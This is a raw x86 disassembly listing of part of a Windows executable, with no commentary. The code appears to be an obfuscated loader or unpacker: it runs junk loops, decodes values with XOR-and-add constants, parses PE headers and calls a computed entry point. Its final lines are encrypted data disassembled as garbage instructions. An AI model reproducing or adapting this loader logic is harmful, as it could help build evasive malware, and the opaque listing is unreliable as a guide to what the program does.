  409d96:	mov    DWORD PTR ds:0x41abd6,edx
  409d9c:	jmp    0x409d50
  409da1:	and    DWORD PTR [ebp-0x4],edi
  409da4:	and    ecx,ecx
  409da6:	mov    ecx,DWORD PTR [ebp-0x4]
  409da9:	inc    edx
  409daa:	imul   ecx,ecx,0x7f659e30
  409db0:	mov    DWORD PTR [ebp-0x4],ecx
  409db3:	mov    edx,DWORD PTR ds:0x412364
  409db9:	xor    edx,DWORD PTR ds:0x4245ae
  409dbf:	mov    DWORD PTR ds:0x412364,edx
  409dc5:	or     DWORD PTR [ebp-0x4],esi
  409dc8:	mov    DWORD PTR ds:0x415105,0x4568
  409dd2:	mov    ecx,DWORD PTR [ebp-0x4]
  409dd5:	mov    edx,DWORD PTR ds:0x415115
  409ddb:	mov    edx,DWORD PTR [ebp-0xc]
  409dde:	cmp    ecx,DWORD PTR [edx]
  409de0:	jne    0x40a327
  409de6:	inc    eax
  409de7:	mov    DWORD PTR ds:0x4245ae,0x6f03
  409df1:	cmp    eax,0x4
  409df4:	jb     0x409d43
  409dfa:	xor    eax,eax
  409dfc:	sbb    DWORD PTR ds:0x412360,edx
  409e02:	shl    DWORD PTR [ebp-0x4],1
  409e05:	and    DWORD PTR [ebp-0x4],edi
  409e08:	mov    ecx,DWORD PTR [ebp-0x4]
  409e0b:	and    DWORD PTR ds:0x417e4d,0x0
  409e15:	mov    edx,DWORD PTR ds:0x417e4d
  409e1b:	inc    edx
  409e1c:	mov    DWORD PTR ds:0x417e4d,edx
  409e22:	cmp    DWORD PTR ds:0x417e4d,0xa
  409e29:	jne    0x409e4c
  409e2f:	push   DWORD PTR [ebp-0x20]
  409e32:	push   0x8411
  409e37:	push   0x41ad5b
  409e3c:	push   0x41adfd
  409e41:	push   0x1dc1
  409e46:	call   DWORD PTR ds:0x40d010
  409e4c:	cmp    DWORD PTR ds:0x417e4d,0x9
  409e53:	jne    0x409e68
  409e59:	xor    edx,edx
  409e5b:	or     edx,DWORD PTR ds:0x417e4d
  409e61:	inc    edx
  409e62:	mov    DWORD PTR ds:0x417e4d,edx
  409e68:	cmp    DWORD PTR ds:0x417e4d,0x19
  409e6f:	jb     0x409e15
  409e75:	mov    edx,DWORD PTR ds:0x417eaa
  409e7b:	mov    edx,DWORD PTR [edx]
  409e7d:	xor    DWORD PTR ds:0x41abda,edx
  409e83:	imul   ecx,ecx,0x7f659e30
  409e89:	mov    edx,DWORD PTR ds:0x412374
  409e8f:	sub    DWORD PTR ds:0x415111,edx
  409e95:	mov    DWORD PTR [ebp-0x4],ecx
  409e98:	and    edx,edx
  409e9a:	or     DWORD PTR [ebp-0x4],esi
  409e9d:	mov    ecx,DWORD PTR [ebp-0x4]
  409ea0:	mov    edx,DWORD PTR [ebp-0xc]
  409ea3:	mov    DWORD PTR ds:0x4245ba,0xa9e
  409ead:	cmp    ecx,DWORD PTR [edx]
  409eaf:	jne    0x40a327
  409eb5:	mov    DWORD PTR ds:0x4150fd,0x72ef
  409ebf:	inc    eax
  409ec0:	cmp    eax,0x4
  409ec3:	mov    DWORD PTR ds:0x412370,0x6303
  409ecd:	jb     0x409dfc
  409ed3:	xor    eax,eax
  409ed5:	and    DWORD PTR ds:0x4150fd,0x0
  409edf:	xor    ecx,ecx
  409ee1:	add    ecx,DWORD PTR ds:0x4150fd
  409ee7:	inc    ecx
  409ee8:	mov    DWORD PTR ds:0x4150fd,ecx
  409eee:	cmp    DWORD PTR ds:0x4150fd,0x28
  409ef5:	jne    0x409f04
  409efb:	push   DWORD PTR [ebp-0x24]
  409efe:	call   DWORD PTR ds:0x40d014
  409f04:	cmp    DWORD PTR ds:0x4150fd,0x18
  409f0b:	jb     0x409edf
  409f11:	add    DWORD PTR ds:0x417e59,0x412378
  409f1b:	shl    DWORD PTR [ebp-0x4],1
  409f1e:	and    DWORD PTR [ebp-0x4],edi
  409f21:	and    DWORD PTR ds:0x412360,0x0
  409f2b:	jmp    0x409f3f
  409f30:	xor    edx,edx
  409f32:	or     edx,DWORD PTR ds:0x412360
  409f38:	inc    edx
  409f39:	mov    DWORD PTR ds:0x412360,edx
  409f3f:	cmp    DWORD PTR ds:0x412360,0x11
  409f46:	jae    0x409f85
  409f4c:	cmp    DWORD PTR ds:0x412360,0x1a
  409f53:	jne    0x409f80
  409f59:	push   0x415119
  409f5e:	push   0x8b4a
  409f63:	push   DWORD PTR [ebp-0x24]
  409f66:	push   0x89fe
  409f6b:	push   0x7f12
  409f70:	push   0x7c49
  409f75:	push   0x1205
  409f7a:	call   DWORD PTR ds:0x40d200
  409f80:	jmp    0x409f30
  409f85:	mov    ecx,DWORD PTR [ebp-0x4]
  409f88:	imul   ecx,ecx,0x7f659e30
  409f8e:	mov    DWORD PTR [ebp-0x4],ecx
  409f91:	or     DWORD PTR [ebp-0x4],esi
  409f94:	mov    ecx,DWORD PTR [ebp-0x4]
  409f97:	mov    edx,DWORD PTR [ebp-0xc]
  409f9a:	mov    DWORD PTR ds:0x4245b6,0x2f25
  409fa4:	cmp    ecx,DWORD PTR [edx]
  409fa6:	mov    DWORD PTR ds:0x412358,0x1252
  409fb0:	jne    0x40a327
  409fb6:	inc    eax
  409fb7:	cmp    eax,0x4
  409fba:	mov    DWORD PTR ds:0x4245ca,0x48e
  409fc4:	jb     0x409ed5
  409fca:	mov    DWORD PTR ds:0x417e55,0x10
  409fd4:	cmp    DWORD PTR ds:0x417e55,0x0
  409fdb:	je     0x40a032
  409fe1:	cmp    DWORD PTR ds:0x417e55,0x19
  409fe8:	jne    0x40a00e
  409fee:	push   DWORD PTR [ebp-0x24]
  409ff1:	push   0x4245ca
  409ff6:	push   DWORD PTR [ebp-0x28]
  409ff9:	push   0x41ada3
  409ffe:	push   0x6e83
  40a003:	push   0x54b6
  40a008:	call   DWORD PTR ds:0x40d204
  40a00e:	mov    edx,DWORD PTR ds:0x417e55
  40a014:	dec    edx
  40a015:	mov    DWORD PTR ds:0x417e55,edx
  40a01b:	jmp    0x409fd4
  40a020:	mov    ecx,DWORD PTR ds:0x40eecc
  40a026:	mov    edx,DWORD PTR ds:0x417eba
  40a02c:	sub    ecx,edx
  40a02e:	imul   ecx,DWORD PTR [ecx+edx*1]
  40a032:	xor    eax,eax
  40a034:	shl    DWORD PTR [ebp-0x4],1
  40a037:	and    DWORD PTR [ebp-0x4],edi
  40a03a:	or     ecx,ecx
  40a03c:	mov    ecx,DWORD PTR [ebp-0x4]
  40a03f:	xor    edx,DWORD PTR ds:0x417e51
  40a045:	imul   ecx,ecx,0x7f659e30
  40a04b:	mov    DWORD PTR ds:0x417e49,0x1d
  40a055:	cmp    DWORD PTR ds:0x417e49,0x0
  40a05c:	je     0x40a0b0
  40a062:	cmp    DWORD PTR ds:0x417e49,0x7
  40a069:	jne    0x40a07a
  40a06f:	push   0x45c2
  40a074:	call   DWORD PTR ds:0x40d208
  40a07a:	cmp    DWORD PTR ds:0x417e49,0x8
  40a081:	jne    0x40a094
  40a087:	mov    edx,DWORD PTR ds:0x417e49
  40a08d:	dec    edx
  40a08e:	mov    DWORD PTR ds:0x417e49,edx
  40a094:	mov    edx,DWORD PTR ds:0x417e49
  40a09a:	dec    edx
  40a09b:	mov    DWORD PTR ds:0x417e49,edx
  40a0a1:	jmp    0x40a055
  40a0a6:	adc    DWORD PTR ds:0x417e45,0x449b
  40a0b0:	mov    DWORD PTR [ebp-0x4],ecx
  40a0b3:	or     ecx,edx
  40a0b5:	or     DWORD PTR [ebp-0x4],esi
  40a0b8:	mov    edx,0x1393
  40a0bd:	mov    ecx,DWORD PTR [ebp-0x4]
  40a0c0:	mov    edx,DWORD PTR [ebp-0xc]
  40a0c3:	mov    DWORD PTR ds:0x41abda,0x516c
  40a0cd:	cmp    ecx,DWORD PTR [edx]
  40a0cf:	jne    0x40a327
  40a0d5:	mov    DWORD PTR ds:0x415111,0x4e99
  40a0df:	inc    eax
  40a0e0:	mov    DWORD PTR ds:0x4245c2,0x1c73
  40a0ea:	cmp    eax,0x4
  40a0ed:	jb     0x40a034
  40a0f3:	xor    eax,eax
  40a0f5:	or     DWORD PTR ds:0x41236c,0x38d4
  40a0ff:	shl    DWORD PTR [ebp-0x4],1
  40a102:	and    DWORD PTR [ebp-0x4],edi
  40a105:	and    ecx,DWORD PTR ds:0x417e59
  40a10b:	mov    ecx,DWORD PTR [ebp-0x4]
  40a10e:	adc    DWORD PTR ds:0x4245be,0x729e
  40a118:	imul   ecx,ecx,0x7f659e30
  40a11e:	adc    edx,0x9b0
  40a124:	mov    DWORD PTR [ebp-0x4],ecx
  40a127:	xor    edx,edx
  40a129:	or     edx,DWORD PTR ds:0x417e55
  40a12f:	xor    DWORD PTR ds:0x4245c6,edx
  40a135:	or     DWORD PTR [ebp-0x4],esi
  40a138:	mov    ecx,DWORD PTR [ebp-0x4]
  40a13b:	mov    edx,DWORD PTR [ebp-0xc]
  40a13e:	mov    DWORD PTR ds:0x4245b6,0xce5
  40a148:	cmp    ecx,DWORD PTR [edx]
  40a14a:	jne    0x40a327
  40a150:	mov    DWORD PTR ds:0x41abd6,0x18a3
  40a15a:	inc    eax
  40a15b:	mov    DWORD PTR ds:0x4245ae,0x5769
  40a165:	cmp    eax,0x4
  40a168:	mov    DWORD PTR ds:0x412358,0x5fb5
  40a172:	jb     0x40a0f5
  40a178:	sbb    ecx,DWORD PTR ds:0x417e59
  40a17e:	xor    eax,eax
  40a180:	mov    DWORD PTR ds:0x412360,0x14
  40a18a:	cmp    DWORD PTR ds:0x412360,0x0
  40a191:	je     0x40a1c1
  40a197:	cmp    DWORD PTR ds:0x412360,0x19
  40a19e:	jne    0x40a1af
  40a1a4:	push   0x2f20
  40a1a9:	call   DWORD PTR ds:0x40d018
  40a1af:	mov    edx,DWORD PTR ds:0x412360
  40a1b5:	dec    edx
  40a1b6:	mov    DWORD PTR ds:0x412360,edx
  40a1bc:	jmp    0x40a18a
  40a1c1:	shl    DWORD PTR [ebp-0x4],1
  40a1c4:	mov    DWORD PTR ds:0x41abe2,0x14
  40a1ce:	cmp    DWORD PTR ds:0x41abe2,0x0
  40a1d5:	je     0x40a233
  40a1db:	cmp    DWORD PTR ds:0x41abe2,0x5
  40a1e2:	jne    0x40a203
  40a1e8:	push   0x1b4e
  40a1ed:	push   DWORD PTR [ebp-0x1c]
  40a1f0:	push   0x1704
  40a1f5:	push   0x41abf4
  40a1fa:	push   DWORD PTR [ebp-0x10]
  40a1fd:	call   DWORD PTR ds:0x40d01c
  40a203:	cmp    DWORD PTR ds:0x41abe2,0x6
  40a20a:	jne    0x40a21d
  40a210:	mov    edx,DWORD PTR ds:0x41abe2
  40a216:	dec    edx
  40a217:	mov    DWORD PTR ds:0x41abe2,edx
  40a21d:	xor    edx,edx
  40a21f:	add    edx,DWORD PTR ds:0x41abe2
  40a225:	dec    edx
  40a226:	mov    DWORD PTR ds:0x41abe2,edx
  40a22c:	jmp    0x40a1ce
  40a231:	neg    edx
  40a233:	and    DWORD PTR [ebp-0x4],edi
  40a236:	mov    ecx,DWORD PTR [ebp-0x4]
  40a239:	neg    edx
  40a23b:	imul   ecx,ecx,0x7f659e30
  40a241:	xor    edx,DWORD PTR ds:0x41abd2
  40a247:	mov    DWORD PTR [ebp-0x4],ecx
  40a24a:	adc    DWORD PTR ds:0x4245b6,ebx
  40a250:	or     DWORD PTR [ebp-0x4],esi
  40a253:	mov    edx,0x77ca
  40a258:	mov    ecx,DWORD PTR [ebp-0x4]
  40a25b:	mov    edx,DWORD PTR [ebp-0xc]
  40a25e:	mov    DWORD PTR ds:0x41510d,0x1bcb
  40a268:	cmp    ecx,DWORD PTR [edx]
  40a26a:	mov    DWORD PTR ds:0x412354,0x3513
  40a274:	jne    0x40a327
  40a27a:	inc    eax
  40a27b:	cmp    eax,0x4
  40a27e:	mov    DWORD PTR ds:0x417e49,0x110e
  40a288:	jb     0x40a180
  40a28e:	xor    eax,eax
  40a290:	shl    DWORD PTR [ebp-0x4],1
  40a293:	and    DWORD PTR [ebp-0x4],edi
  40a296:	mov    ecx,DWORD PTR [ebp-0x4]
  40a299:	imul   ecx,ecx,0x7f659e30
  40a29f:	mov    DWORD PTR [ebp-0x4],ecx
  40a2a2:	or     DWORD PTR [ebp-0x4],esi
  40a2a5:	mov    ecx,DWORD PTR [ebp-0x4]
  40a2a8:	mov    edx,DWORD PTR [ebp-0xc]
  40a2ab:	cmp    ecx,DWORD PTR [edx]
  40a2ad:	jne    0x40a327
  40a2b3:	inc    eax
  40a2b4:	cmp    eax,0x4
  40a2b7:	jb     0x40a290
  40a2bd:	inc    ebx
  40a2be:	cmp    ebx,0x10
  40a2c1:	jb     0x409b50
  40a2c7:	mov    ebx,0xf89c8538
  40a2cc:	mov    DWORD PTR [ebp-0xc],ebx
  40a2cf:	mov    DWORD PTR [ebp-0x8],0xf89c853b
  40a2d6:	lea    eax,[ebp-0x1c]
  40a2d9:	mov    DWORD PTR [ebp-0x18],eax
  40a2dc:	lea    eax,[ebp-0x20]
  40a2df:	mov    DWORD PTR [ebp-0x10],eax
  40a2e2:	mov    eax,ds:0x40d5d0
  40a2e7:	mov    eax,DWORD PTR [eax+0x1c8]
  40a2ed:	mov    eax,DWORD PTR [eax]
  40a2ef:	mov    ecx,DWORD PTR [ebp-0x10]
  40a2f2:	mov    esi,0x7510859
  40a2f7:	xor    eax,esi
  40a2f9:	mov    edi,0x32729f
  40a2fe:	add    eax,edi
  40a300:	mov    DWORD PTR [ecx],eax
  40a302:	mov    eax,ds:0x40d854
  40a307:	cmp    eax,0x23d14057
  40a30c:	mov    eax,DWORD PTR [ebp-0x8]
  40a30f:	je     0x40a32e
  40a315:	mov    ecx,DWORD PTR [ebp-0xc]
  40a318:	xor    eax,esi
  40a31a:	add    eax,edi
  40a31c:	imul   eax,ecx
  40a31f:	mov    DWORD PTR [ebp-0xc],eax
  40a322:	jmp    0x40a371
  40a327:	xor    eax,eax
  40a329:	jmp    0x40a5d0
  40a32e:	xor    eax,esi
  40a330:	add    eax,edi
  40a332:	mov    ds:0x40d6e0,eax
  40a337:	mov    eax,DWORD PTR [ebp-0xc]
  40a33a:	xor    eax,esi
  40a33c:	add    eax,edi
  40a33e:	mov    ds:0x40d854,eax
  40a343:	mov    eax,DWORD PTR [ebp-0x8]
  40a346:	mov    ecx,DWORD PTR ds:0x40d6e0
  40a34c:	xor    eax,esi
  40a34e:	add    eax,edi
  40a350:	cmp    ecx,eax
  40a352:	jne    0x40a371
  40a358:	push   0x40d72c
  40a35d:	call   DWORD PTR ds:0x40d1ec
  40a363:	mov    ecx,DWORD PTR ds:0x40d5d0
  40a369:	mov    ecx,DWORD PTR [ecx+0x198]
  40a36f:	mov    DWORD PTR [ecx],eax
  40a371:	mov    eax,ds:0x40d5d0
  40a376:	mov    eax,DWORD PTR [eax+0x18c]
  40a37c:	mov    eax,DWORD PTR [eax]
  40a37e:	mov    DWORD PTR [ebp-0x24],eax
  40a381:	mov    eax,0xf89c853c
  40a386:	mov    DWORD PTR [ebp-0x28],eax
  40a389:	mov    DWORD PTR [ebp-0x28],eax
  40a38c:	mov    DWORD PTR [ebp-0x28],eax
  40a38f:	mov    DWORD PTR [ebp-0x10],ebx
  40a392:	mov    DWORD PTR [ebp-0x28],eax
  40a395:	mov    DWORD PTR [ebp-0x28],0xf89c8530
  40a39c:	mov    ebx,DWORD PTR [ebp-0xc]
  40a39f:	mov    ecx,DWORD PTR [ebp-0x8]
  40a3a2:	mov    edx,DWORD PTR [ebp-0x8]
  40a3a5:	xor    edx,esi
  40a3a7:	xor    ecx,esi
  40a3a9:	add    ecx,edx
  40a3ab:	mov    edx,DWORD PTR [ebp-0x8]
  40a3ae:	xor    ebx,esi
  40a3b0:	xor    edx,esi
  40a3b2:	add    ebx,edi
  40a3b4:	lea    ecx,[ecx+edx*1+0x9757dd]
  40a3bb:	cmp    ebx,ecx
  40a3bd:	ja     0x40a41e
  40a3c3:	mov    eax,DWORD PTR [ebp-0x8]
  40a3c6:	xor    eax,esi
  40a3c8:	lea    eax,[eax+ebx*1+0x32729f]
  40a3cf:	push   eax
  40a3d0:	mov    eax,DWORD PTR [ebp-0x10]
  40a3d3:	xor    eax,esi
  40a3d5:	lea    eax,[ebp+eax*1+0x3272a7]
  40a3dc:	push   eax
  40a3dd:	mov    eax,ds:0x40d5d0
  40a3e2:	push   DWORD PTR [eax+0x1bc]
  40a3e8:	call   0x40742d
  40a3ed:	mov    eax,DWORD PTR [ebp-0x8]
  40a3f0:	xor    eax,esi
  40a3f2:	lea    ebx,[ebx+eax*1+0x32729f]
  40a3f9:	mov    eax,DWORD PTR [ebp-0x8]
  40a3fc:	mov    ecx,DWORD PTR [ebp-0x8]
  40a3ff:	xor    ecx,esi
  40a401:	xor    eax,esi
  40a403:	add    eax,ecx
  40a405:	mov    ecx,DWORD PTR [ebp-0x8]
  40a408:	xor    ecx,esi
  40a40a:	lea    eax,[eax+ecx*1+0x9757dd]
  40a411:	cmp    ebx,eax
  40a413:	jbe    0x40a3c3
  40a419:	mov    eax,0xf89c853c
  40a41e:	mov    ecx,DWORD PTR [ebp+0xc]
  40a421:	mov    DWORD PTR ds:0x40d454,ecx
  40a427:	mov    ecx,DWORD PTR [ebp+0x10]
  40a42a:	mov    DWORD PTR ds:0x40d6a8,ecx
  40a430:	mov    ecx,DWORD PTR ds:0x40d454
  40a436:	mov    edx,DWORD PTR [ebp-0x18]
  40a439:	sub    ecx,edi
  40a43b:	xor    ecx,esi
  40a43d:	mov    DWORD PTR [edx],ecx
  40a43f:	mov    ecx,DWORD PTR [ebp-0x1c]
  40a442:	cmp    ecx,0xf89c853b
  40a448:	je     0x40a4a5
  40a44e:	mov    ecx,DWORD PTR [ebp-0xc]
  40a451:	mov    edx,DWORD PTR [ebp-0x20]
  40a454:	xor    ecx,esi
  40a456:	add    ecx,edi
  40a458:	cmp    ecx,edx
  40a45a:	je     0x40a4a5
  40a460:	mov    eax,ds:0x40d5d0
  40a465:	mov    eax,DWORD PTR [eax+0x194]
  40a46b:	mov    ecx,DWORD PTR [eax]
  40a46d:	mov    eax,DWORD PTR [ecx+0x3c]
  40a470:	push   DWORD PTR ds:0x40d6a8
  40a476:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  40a47a:	push   DWORD PTR ds:0x40d454
  40a480:	add    eax,ecx
  40a482:	mov    ecx,DWORD PTR ds:0x40d5d0
  40a488:	mov    ecx,DWORD PTR [ecx+0x194]
  40a48e:	push   DWORD PTR [ecx]
  40a490:	call   eax
  40a492:	mov    ecx,DWORD PTR ds:0x40d5d0
  40a498:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40a49e:	mov    DWORD PTR [ecx],eax
  40a4a0:	jmp    0x40a5b5
  40a4a5:	mov    ecx,DWORD PTR [ebp-0xc]
  40a4a8:	mov    edx,DWORD PTR [ebp-0x24]
  40a4ab:	xor    ecx,esi
  40a4ad:	add    ecx,edi
  40a4af:	cmp    ecx,edx
  40a4b1:	jne    0x40a598
  40a4b7:	mov    ecx,DWORD PTR [ebp-0xc]
  40a4ba:	xor    ecx,esi
  40a4bc:	add    ecx,edi
  40a4be:	mov    DWORD PTR ds:0x40d654,ecx
  40a4c4:	mov    ecx,DWORD PTR [ebp-0xc]
  40a4c7:	xor    ecx,esi
  40a4c9:	add    ecx,edi
  40a4cb:	mov    DWORD PTR ds:0x40d64c,ecx
  40a4d1:	mov    ecx,DWORD PTR [ebp-0x8]
  40a4d4:	mov    DWORD PTR [ebp-0x10],ecx
  40a4d7:	mov    ecx,DWORD PTR [ebp-0xc]
  40a4da:	mov    DWORD PTR [ebp+0xc],ecx
  40a4dd:	mov    ecx,DWORD PTR [ebp+0xc]
  40a4e0:	xor    ecx,esi
  40a4e2:	add    ecx,edi
  40a4e4:	mov    DWORD PTR [ebp+0xc],ecx
  40a4e7:	mov    ecx,DWORD PTR ds:0x40d450
  40a4ed:	mov    ecx,DWORD PTR [ecx]
  40a4ef:	mov    DWORD PTR [ebp+0xc],ecx
  40a4f2:	mov    ecx,DWORD PTR ds:0x40d658
  40a4f8:	mov    ecx,DWORD PTR [ecx]
  40a4fa:	mov    DWORD PTR [ebp-0x18],ecx
  40a4fd:	mov    DWORD PTR [ebp+0x10],0xf89c8738
  40a504:	mov    ecx,DWORD PTR [ebp+0x10]
  40a507:	xor    ecx,esi
  40a509:	add    ecx,edi
  40a50b:	mov    DWORD PTR [ebp+0x10],ecx
  40a50e:	mov    ecx,DWORD PTR ds:0x40d5d0
  40a514:	mov    DWORD PTR [ebp+0x10],ecx
  40a517:	mov    ecx,DWORD PTR [ebp+0xc]
  40a51a:	mov    DWORD PTR [ebp+0xc],ecx
  40a51d:	mov    ecx,DWORD PTR [ebp+0xc]
  40a520:	push   0x4
  40a522:	pop    edx
  40a523:	sub    edx,ecx
  40a525:	add    edx,DWORD PTR [ebp-0x18]
  40a528:	mov    DWORD PTR [ebp-0x28],0xf89c85f8
  40a52f:	mov    DWORD PTR [ebp+0x10],edx
  40a532:	mov    DWORD PTR [ebp-0x74],eax
  40a535:	mov    eax,DWORD PTR [ebp+0xc]
  40a538:	mov    DWORD PTR [ebp-0x70],eax
  40a53b:	mov    eax,DWORD PTR [ebp+0x10]
  40a53e:	mov    DWORD PTR [ebp-0x6c],eax
  40a541:	mov    eax,DWORD PTR [ebp-0x28]
  40a544:	xor    eax,esi
  40a546:	add    eax,edi
  40a548:	mov    DWORD PTR [ebp-0x68],eax
  40a54b:	lea    eax,[ebp-0x30]
  40a54e:	mov    DWORD PTR [ebp-0x64],eax
  40a551:	mov    eax,DWORD PTR [ebp-0x74]
  40a554:	xor    eax,esi
  40a556:	add    eax,edi
  40a558:	mov    DWORD PTR [ebp-0x74],eax
  40a55b:	lea    eax,[ebp-0x74]
  40a55e:	push   eax
  40a55f:	mov    eax,DWORD PTR [ebp-0x10]
  40a562:	xor    eax,esi
  40a564:	add    eax,edi
  40a566:	push   eax
  40a567:	mov    eax,ds:0x40d5f0
  40a56c:	push   0x40d546
  40a571:	push   DWORD PTR [eax]
  40a573:	call   0x40ae4d
  40a578:	xor    esi,esi
  40a57a:	mov    eax,DWORD PTR [ebp+0x10]
  40a57d:	sub    eax,esi
  40a57f:	push   eax
  40a580:	mov    eax,DWORD PTR [ebp+0xc]
  40a583:	add    eax,esi
  40a585:	push   eax
  40a586:	call   0x4059cb
  40a58b:	inc    esi
  40a58c:	cmp    esi,0x52
  40a58f:	jb     0x40a57a
  40a595:	mov    eax,DWORD PTR [ebp-0x10]
  40a598:	call   0x404704
  40a59d:	lea    eax,[ebp+0x4]
  40a5a0:	mov    DWORD PTR [ebp-0x2c],eax
  40a5a3:	mov    eax,DWORD PTR [ebp-0x14]
  40a5a6:	mov    eax,DWORD PTR [ebp-0x8]
  40a5a9:	push   DWORD PTR [ebp-0xc]
  40a5ac:	lea    eax,[ebp-0x2c]
  40a5af:	push   eax
  40a5b0:	call   0x407c0a
  40a5b5:	mov    eax,ds:0x40d5d0
  40a5ba:	push   0x4
  40a5bc:	add    eax,0x1cc
  40a5c1:	push   eax
  40a5c2:	lea    eax,[ebp-0x14]
  40a5c5:	push   eax
  40a5c6:	call   0x40742d
  40a5cb:	mov    eax,DWORD PTR [ebp-0x14]
  40a5ce:	mov    eax,DWORD PTR [eax]
  40a5d0:	pop    edi
  40a5d1:	pop    esi
  40a5d2:	pop    ebx
  40a5d3:	leave  
  40a5d4:	ret    0xc
  40a5d7:	push   ebp
  40a5d8:	mov    ebp,esp
  40a5da:	sub    esp,0x14
  40a5dd:	leave  
  40a5de:	ret    0x4
  40a5e1:	push   ebp
  40a5e2:	mov    ebp,esp
  40a5e4:	push   ecx
  40a5e5:	or     eax,0x5cec
  40a5ea:	mov    DWORD PTR [ebp-0x4],0xf89c8538
  40a5f1:	add    eax,0x77b5
  40a5f6:	mov    eax,DWORD PTR [ebp+0x8]
  40a5f9:	mov    al,BYTE PTR [eax]
  40a5fb:	add    DWORD PTR ds:0x412354,0x2449
  40a605:	add    al,0x34
  40a607:	sbb    DWORD PTR ds:0x41237c,0x412364
  40a611:	xor    al,0x4a
  40a613:	cmp    al,0xcb
  40a615:	mov    DWORD PTR ds:0x4245c2,0x6064
  40a61f:	jne    0x40a6b9
  40a625:	mov    eax,DWORD PTR [ebp+0x8]
  40a628:	mov    ecx,DWORD PTR [ebp+0x8]
  40a62b:	add    ecx,DWORD PTR [eax+0x3c]
  40a62e:	mov    edx,0x7510859
  40a633:	and    DWORD PTR ds:0x412368,0x0
  40a63d:	mov    eax,ds:0x412368
  40a642:	inc    eax
  40a643:	mov    ds:0x412368,eax
  40a648:	cmp    DWORD PTR ds:0x412368,0xe
  40a64f:	jne    0x40a663
  40a655:	push   0x41236c
  40a65a:	push   DWORD PTR [ebp-0x10]
  40a65d:	call   DWORD PTR ds:0x40d398
  40a663:	cmp    DWORD PTR ds:0x412368,0xd
  40a66a:	jne    0x40a67b
  40a670:	mov    eax,ds:0x412368
  40a675:	inc    eax
  40a676:	mov    ds:0x412368,eax
  40a67b:	cmp    DWORD PTR ds:0x412368,0x1f
  40a682:	jb     0x40a63d
  40a688:	mov    DWORD PTR [ebp+0x8],ecx
  40a68b:	mov    eax,DWORD PTR [ebp-0x4]
  40a68e:	xor    eax,edx
  40a690:	push   esi
  40a691:	mov    esi,DWORD PTR [ebp+0x8]
  40a694:	mov    ecx,0x32729f
  40a699:	add    eax,ecx
  40a69b:	cmp    DWORD PTR [esi+0x54],eax
  40a69e:	pop    esi
  40a69f:	je     0x40a6ad
  40a6a5:	mov    eax,DWORD PTR [ebp+0x8]
  40a6a8:	jmp    0x40a6c6
  40a6ad:	mov    eax,DWORD PTR [ebp-0x4]
  40a6b0:	xor    eax,edx
  40a6b2:	add    eax,ecx
  40a6b4:	jmp    0x40a6c6
  40a6b9:	mov    eax,DWORD PTR [ebp-0x4]
  40a6bc:	xor    eax,0x7510859
  40a6c1:	add    eax,0x32729f
  40a6c6:	leave  
  40a6c7:	ret    0x4
  40a6ca:	push   ebp
  40a6cb:	mov    ebp,esp
  40a6cd:	push   ecx
  40a6ce:	mov    DWORD PTR ds:0x417e41,0x1a
  40a6d8:	cmp    DWORD PTR ds:0x417e41,0x0
  40a6df:	je     0x40a739
  40a6e5:	cmp    DWORD PTR ds:0x417e41,0x4
  40a6ec:	jne    0x40a70f
  40a6f2:	push   0x6416
  40a6f7:	push   0x57a6
  40a6fc:	push   0x7327
  40a701:	push   DWORD PTR [ebp-0xc]
  40a704:	push   0x1809
  40a709:	call   DWORD PTR ds:0x40d39c
  40a70f:	cmp    DWORD PTR ds:0x417e41,0x5
  40a716:	jne    0x40a727
  40a71c:	mov    eax,ds:0x417e41
  40a721:	dec    eax
  40a722:	mov    ds:0x417e41,eax
  40a727:	mov    eax,ds:0x417e41
  40a72c:	dec    eax
  40a72d:	mov    ds:0x417e41,eax
  40a732:	jmp    0x40a6d8
  40a737:	sub    edx,edx
  40a739:	push   ecx
  40a73a:	sub    edx,eax
  40a73c:	mov    DWORD PTR [ebp-0x8],0xf89c8538
  40a743:	and    DWORD PTR ds:0x412358,0x0
  40a74d:	jmp    0x40a761
  40a752:	xor    edx,edx
  40a754:	add    edx,DWORD PTR ds:0x412358
  40a75a:	inc    edx
  40a75b:	mov    DWORD PTR ds:0x412358,edx
  40a761:	cmp    DWORD PTR ds:0x412358,0x11
  40a768:	jae    0x40a79c
  40a76e:	cmp    DWORD PTR ds:0x412358,0x18
  40a775:	jne    0x40a791
  40a77b:	push   0x4012
  40a780:	push   DWORD PTR [ebp-0xc]
  40a783:	push   0x7b7f
  40a788:	push   DWORD PTR [ebp-0xc]
  40a78b:	call   DWORD PTR ds:0x40d020
  40a791:	jmp    0x40a752
  40a796:	sub    DWORD PTR ds:0x4245ae,ebx
  40a79c:	mov    DWORD PTR [ebp-0x4],0xf89c853b
  40a7a3:	jmp    0x40a91b
  40a7a8:	(bad)  
  40a7a9:	jmp    0x40a73d
  40a7ab:	aam    0x78
  40a7ad:	push   ebp
  40a7ae:	pop    ecx
  40a7af:	jnp    0x40a756
  40a7b1:	fwait
  40a7b2:	jne    0x40a830
  40a7b4:	repnz aam 0xe9
  40a7b7:	loope  0x40a7be
  40a7b9:	and    eax,0x7fc57e7e
  40a7be:	jle    0x40a83e
  40a7c0:	jl     0x40a812
  40a7c2:	pop    eax
  40a7c3:	(bad)  
  40a7c4:	sub    dh,dl
  40a7c6:	mov    bl,BYTE PTR [esi+0x13881ab7]
  40a7cc:	stos   BYTE PTR es:[edi],al
  40a7cd:	xor    ah,BYTE PTR [esi+0x1864b9ff]
  40a7d3:	jo     0x40a825
  40a7d5:	mov    ecx,0xe0e4fc40
  40a7da:	sbb    cl,BYTE PTR [ebp+ebx*4-0x48a9a1db]
  40a7e1:	jp     0x40a851
  40a7e3:	scas   al,BYTE PTR es:[edi]
  40a7e4:	push   ds
  40a7e5:	pop    edx
  40a7e6:	cmp    al,0x3f
  40a7e8:	pop    ss
  40a7e9:	push   es
  40a7ea:	shl    edi,cl
  40a7ec:	popa   
  40a7ed:	aaa    
  40a7ee:	or     esp,ecx
  40a7f0:	rcl    DWORD PTR [eax-0x8414210],0x36
  40a7f7:	xchg   BYTE PTR es:[esi-0x5f],bh
  40a7fb:	mov    bl,BYTE PTR ds:0x852a78e5
  40a801:	push   ds
  40a802:	test   BYTE PTR [ebp-0x3c6f24da],cl
  40a808:	out    0x73,eax
  40a80a:	cs xchg esi,eax
  40a80c:	mov    esi,0x4f70fed6
  40a811:	mov    edx,0x290be85
  40a816:	pop    edx
  40a817:	jmp    0xa1d34763
  40a81c:	stos   BYTE PTR es:[edi],al
  40a81d:	hlt    
  40a81e:	in     eax,dx
  40a81f:	xchg   edi,eax
  40a820:	and    cl,BYTE PTR [edi]
